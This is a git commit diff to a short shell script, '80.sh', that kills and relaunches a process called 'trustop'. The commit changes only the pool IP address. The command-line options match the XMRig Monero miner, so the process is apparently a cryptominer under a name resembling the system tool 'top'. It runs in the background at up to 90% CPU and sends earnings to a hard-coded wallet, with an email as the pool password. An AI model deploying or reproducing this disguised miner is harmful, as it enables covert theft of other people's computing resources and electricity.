63a86d17e117cba048a1cbe457c36fd395822782
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-06-06 20:35:14 +0100

    Add files via upload

--- 80.sh
+++ 80.sh
@@ -1,3 +1,3 @@
 pkill trustop
 sleep 7
-trustop -o 159.69.54.1:2422 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
+trustop -o 95.216.163.200:5444 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
